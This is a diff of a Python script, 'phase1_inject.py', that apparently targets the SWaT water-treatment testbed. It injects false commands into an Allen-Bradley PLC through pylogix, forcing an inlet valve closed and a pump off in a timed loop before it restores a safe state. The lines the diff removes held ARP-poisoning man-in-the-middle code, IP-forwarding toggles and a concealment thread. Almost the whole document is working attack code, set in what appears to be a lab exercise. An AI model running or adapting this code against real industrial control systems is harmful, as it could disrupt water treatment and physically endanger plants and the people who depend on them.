@@ -1,160 +1,142 @@
 #!/usr/bin/env python3
 """
-phase1_inject.py  —  SWaT Phase 1: False Command Injection via pylogix
+phase1_inject.py  —  SWaT Phase 1: False Command Injection (HMI-based)
 Target: Allen-Bradley ControlLogix PLC1 at 192.168.1.10
 
-Attack flow:
-  Thread 1 — ARP poison HMI <-> PLC1
-  Thread 2 — Write false commands to PLC1 via pylogix (two-step: Auto=False, Cmd=value)
-  Thread 3 — Concealment logging using Phase 0 DB
-  On exit  — Restore all tags to safe state
+Running from the HMI directly — no ARP poisoning needed.
+The HMI already has legitimate EtherNet/IP access to PLC1.
+We simply write false tag values directly via pylogix.
 
-Tag write pattern (from lab reference script):
-  write_tag(ip, 'HMI_MV101.Auto', False)   # take out of auto
-  write_tag(ip, 'HMI_MV101.Cmd', 1)        # 1=CLOSE, 2=OPEN
-  write_tag(ip, 'HMI_MV101.Auto', True)    # restore auto
+Attack:
+  - Take MV101 out of auto, command CLOSE
+  - Take P101 out of auto, command OFF
+  - Loop for duration seconds
+  - On exit: restore safe state
 
 Usage:
-  sudo python3 phase1_inject.py --plc-ip 192.168.1.10 --hmi-ip 192.168.1.100 \
-      --iface eth0 --db enip_db.pkl --duration 120
+  python3 phase1_inject.py --plc-ip 192.168.1.10 --duration 120
 """
 
-import argparse, pickle, time, threading, signal, os
+import argparse, time, signal, pickle, os
 from datetime import datetime
 from pylogix import PLC
-from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip
 
-# Attack commands — close MV101, stop P101
-# Cmd values: 1=CLOSE/OFF, 2=OPEN/ON
+# Attack commands — two-step pattern: disable auto, issue command
 ATTACK_CMDS = [
-    ('HMI_MV101.Auto', False),   # take MV101 out of auto
-    ('HMI_MV101.Cmd',  1),       # close MV101 (1=CLOSE)
-    ('HMI_P101.Auto',  False),   # take P101 out of auto
-    ('HMI_P101.Cmd',   1),       # stop P101 (1=OFF)
+    ('HMI_MV101.Auto', False),   # take MV101 out of auto mode
+    ('HMI_MV101.Cmd',  1),       # 1=CLOSE inlet valve
+    ('HMI_P101.Auto',  False),   # take P101 out of auto mode
+    ('HMI_P101.Cmd',   1),       # 1=OFF stop pump
 ]
 
 # Safe state to restore on exit
 SAFE_CMDS = [
-    ('HMI_MV101.Cmd',  2),       # open MV101
+    ('HMI_MV101.Cmd',  2),       # 2=OPEN inlet valve
     ('HMI_MV101.Auto', True),    # restore auto
-    ('HMI_P101.Cmd',   2),       # start P101
+    ('HMI_P101.Cmd',   2),       # 2=ON start pump
     ('HMI_P101.Auto',  True),    # restore auto
 ]
 
-stop_event = threading.Event()
+stop_flag = False
 
 
-def write_tag(ip, tag, value):
+def write_tag(plc, tag, value):
+    ret = plc.Write(tag, value)
+    return ret
+
+
+def inject_loop(plc_ip, duration, interval=1.0):
+    print(f"[*] Connecting to PLC1 at {plc_ip}...")
+    cycle = 0
+    end_time = time.time() + duration
+
     with PLC() as plc:
-        plc.IPAddress = ip
-        plc.Write(tag, value)
+        plc.IPAddress = plc_ip
 
+        # Verify connection first
+        test = plc.Read('HMI_LIT101.Pv')
+        if test.Value is None:
+            print(f"[!] Cannot read PLC — check IP and connectivity: {test.Status}")
+            return
 
-def arp_poison(plc_ip, hmi_ip, iface, interval=1.5):
-    my_mac  = get_if_hwaddr(iface)
-    plc_mac = getmacbyip(plc_ip)
-    hmi_mac = getmacbyip(hmi_ip)
-    if not plc_mac or not hmi_mac:
-        print(f"[!] Cannot resolve MACs — PLC:{plc_mac} HMI:{hmi_mac}")
-        return
-    print(f"[*] ARP poison: PLC {plc_ip} ({plc_mac}) <-> HMI {hmi_ip} ({hmi_mac})")
-    pkt_hmi = Ether(dst=hmi_mac)/ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=my_mac)
-    pkt_plc = Ether(dst=plc_mac)/ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=my_mac)
-    while not stop_event.is_set():
-        sendp([pkt_hmi, pkt_plc], iface=iface, verbose=False)
-        time.sleep(interval)
-    # Restore ARP
-    r_hmi = Ether(dst=hmi_mac)/ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=plc_mac)
-    r_plc = Ether(dst=plc_mac)/ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=hmi_mac)
-    for _ in range(5):
-        sendp([r_hmi, r_plc], iface=iface, verbose=False)
-        time.sleep(0.2)
-    print("[+] ARP restored")
+        print(f"[*] Connected. LIT101={test.Value:.1f}mm")
+        print(f"[*] Injecting false commands for {duration}s — Ctrl+C to abort\n")
 
-
-def inject_tags(plc_ip, interval=1.0):
-    print(f"[*] Tag injection -> PLC {plc_ip}")
-    cycle = 0
-    while not stop_event.is_set():
-        try:
+        while not stop_flag and time.time() < end_time:
+            errors = []
             for tag, val in ATTACK_CMDS:
-                write_tag(plc_ip, tag, val)
+                ret = write_tag(plc, tag, val)
+                if ret.Status != 'Success':
+                    errors.append(f"{tag}: {ret.Status}")
+
+            # Read current state to show effect
+            lit = plc.Read('HMI_LIT101.Pv').Value
+            fit = plc.Read('AI_FIT_101_FLOW').Value
+            mv  = plc.Read('HMI_MV101.Cmd').Value
+
             cycle += 1
-            if cycle % 5 == 0:
-                print(f"    [inject {cycle:4d}]  MV101=CLOSED  P101=OFF")
-        except Exception as e:
-            print(f"    [!] Write error: {e}")
-        time.sleep(interval)
-
-
-def conceal_tags(plc_ip, db_path, interval=1.0):
-    if not db_path or not os.path.exists(db_path):
-        print("[*] No Phase 0 DB — concealment inactive")
-        return
-    with open(db_path, 'rb') as f:
-        db = pickle.load(f)
-    print(f"[*] Concealment active — Phase 0 DB: {len(db)} tags")
-    cycle = 0
-    while not stop_event.is_set():
-        cycle += 1
-        if cycle % 10 == 0:
-            for name, samples in db.items():
-                if samples:
-                    print(f"    [conceal] {name}: cached={samples[-1][1]}")
-        time.sleep(interval)
+            ts = datetime.now().strftime('%H:%M:%S')
+            if errors:
+                print(f"[{ts}] cycle={cycle:4d}  ERRORS: {errors}")
+            else:
+                print(f"[{ts}] cycle={cycle:4d}  "
+                      f"MV101={'CLOSED' if mv==1 else 'OPEN'}  "
+                      f"LIT101={lit:.1f}mm  FIT101={fit:.3f}  "
+                      f"[attack active]")
+            time.sleep(interval)
 
 
 def restore_plc(plc_ip):
-    print(f"\n[*] Restoring PLC safe state -> {plc_ip}")
+    print(f"\n[*] Restoring safe state on PLC {plc_ip}...")
     try:
-        for tag, val in SAFE_CMDS:
-            write_tag(plc_ip, tag, val)
-            print(f"    {tag} = {val}  [OK]")
-        print("[+] Safe state restored")
+        with PLC() as plc:
+            plc.IPAddress = plc_ip
+            for tag, val in SAFE_CMDS:
+                ret = plc.Write(tag, val)
+                status = ret.Status
+                print(f"    {tag} = {val}  [{status}]")
+
+        # Verify
+        with PLC() as plc:
+            plc.IPAddress = plc_ip
+            mv  = plc.Read('HMI_MV101.Cmd').Value
+            p1a = plc.Read('HMI_P101.Auto').Value
+            lit = plc.Read('HMI_LIT101.Pv').Value
+            print(f"\n[+] Verified: MV101={'OPEN' if mv==2 else 'CLOSED'}  "
+                  f"P101.Auto={p1a}  LIT101={lit:.1f}mm")
+        print("[+] Safe state restored.")
     except Exception as e:
         print(f"[!] Restore failed: {e}")
-        print("    *** Manually restore MV101 and P101 via HMI! ***")
+        print("    *** Manually restore MV101 and P101 via HMI interface! ***")
 
 
 def signal_handler(sig, frame):
-    print("\n[!] Stopping...")
-    stop_event.set()
+    global stop_flag
+    print("\n[!] Ctrl+C — stopping attack...")
+    stop_flag = True
 
 
 def main():
     ap = argparse.ArgumentParser()
-    ap.add_argument('--plc-ip',   default='192.168.1.10')
-    ap.add_argument('--hmi-ip',   required=True)
-    ap.add_argument('--iface',    default='eth0')
-    ap.add_argument('--db',       default='enip_db.pkl')
-    ap.add_argument('--duration', type=int, default=120)
+    ap.add_argument('--plc-ip',   default='192.168.1.10', help='PLC1A IP address')
+    ap.add_argument('--duration', type=int, default=120,  help='Attack duration in seconds')
+    ap.add_argument('--interval', type=float, default=1.0, help='Write interval in seconds')
     args = ap.parse_args()
 
     signal.signal(signal.SIGINT, signal_handler)
 
     print("=" * 60)
-    print("  SWaT Phase 1 — False Command Injection (pylogix)")
-    print(f"  PLC: {args.plc_ip}   HMI: {args.hmi_ip}   Duration: {args.duration}s")
+    print("  SWaT Phase 1 — Direct CIP Tag Injection (HMI-based)")
+    print(f"  PLC: {args.plc_ip}   Duration: {args.duration}s")
+    print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print("=" * 60)
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print("[*] Note: Running from HMI — no ARP poisoning needed")
+    print("[*] HMI has direct EtherNet/IP access to PLC1\n")
 
-    threads = [
-        threading.Thread(target=arp_poison,   args=(args.plc_ip, args.hmi_ip, args.iface), daemon=True),
-        threading.Thread(target=inject_tags,  args=(args.plc_ip,), daemon=True),
-        threading.Thread(target=conceal_tags, args=(args.plc_ip, args.db), daemon=True),
-    ]
-    for t in threads:
-        t.start()
-
-    print(f"\n[*] Attack running for {args.duration}s — Ctrl+C to abort")
-    stop_event.wait(timeout=args.duration)
-    stop_event.set()
-    for t in threads:
-        t.join(timeout=3)
-
+    inject_loop(args.plc_ip, args.duration, args.interval)
     restore_plc(args.plc_ip)
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    print("[+] Phase 1 complete")
+    print("[+] Phase 1 complete.")
+
 
 if __name__ == '__main__':
     main()
